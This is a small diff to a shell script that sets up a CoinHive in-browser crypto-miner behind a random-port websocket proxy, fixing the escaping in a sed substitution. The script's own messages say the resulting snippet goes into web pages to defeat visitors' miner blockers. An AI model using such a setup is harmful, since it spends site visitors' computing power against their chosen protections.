@@ -40,7 +40,7 @@ if [ "$proxyYes" == "y" ]; then
     echo Substituting the proxy into $minerblock...
     port=$(shuf -i 2000-65000 -n 1)
     strSub='CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://'$domainName':'$port'"]];'
-    sed -i 's/////strSub/'$strSub'/g' $minerblock
+    sed -i 's/\/\/strSub/'$strSub'/g' $minerblock
     echo You need to run proxy.sh along with whatever server software you are using as long as you want Coinhive to work
 fi
   echo You need to put the following into your HTML files that you want to have protection against Minerblockers:
